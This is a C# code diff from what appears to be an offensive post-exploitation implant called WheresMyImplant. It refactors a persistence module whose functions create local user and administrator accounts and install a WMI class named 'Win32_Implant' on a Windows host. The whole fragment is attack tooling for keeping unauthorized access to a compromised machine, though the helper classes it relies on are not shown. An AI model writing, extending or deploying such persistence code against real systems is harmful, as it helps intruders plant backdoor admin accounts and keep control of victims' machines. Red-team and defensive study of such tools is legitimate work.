@@ -1,33 +1,29 @@
 ﻿using System;
-using System.Management.Instrumentation;
-using System.Text;
 
 namespace WheresMyImplant
 {
-    public partial class Implant
+    public sealed class Persistence
     {
-        [ManagementTask]
-        public static String AddUser(String username, String password, String admin)
+        public static void AddLocalUser(String username, String password, String admin)
         {
-            if (!Boolean.TryParse(admin, out Boolean isAdmin))
+            if (!Boolean.TryParse(admin, out Boolean bAdmin))
             {
-                return String.Empty;
+                Console.WriteLine("Unable to parse wait parameter (true, false)");
+                return;
             }
 
             AddUser add = new AddUser();
-            if (isAdmin)
+            if (bAdmin)
             {
                 add.AddLocalAdmin(username, password);
-                return "Admin Added";
+                Console.WriteLine("[+] Admin Added");
             }
             add.AddLocalUser(username, password);
-            return "User Added";
+            Console.WriteLine("[+] User Added");
         }
 
-        [ManagementTask]
-        public static String Install()
+        public static void Install()
         {
-            StringBuilder output = new StringBuilder();
             InstallWMI install = new InstallWMI(".", @"ROOT\cimv2", "Win32_Implant");
             try
             {
@@ -38,13 +34,9 @@ namespace WheresMyImplant
             }
             catch (Exception ex)
             {
-                output.Append(ex.ToString());
+                Console.WriteLine("[-] Unhandled Exception Occured");
+                Console.WriteLine("[-] {0}", ex.Message);
             }
-            finally
-            {
-                output.Append(install.GetOutput());
-            }
-            return output.ToString();
         }
     }
 }
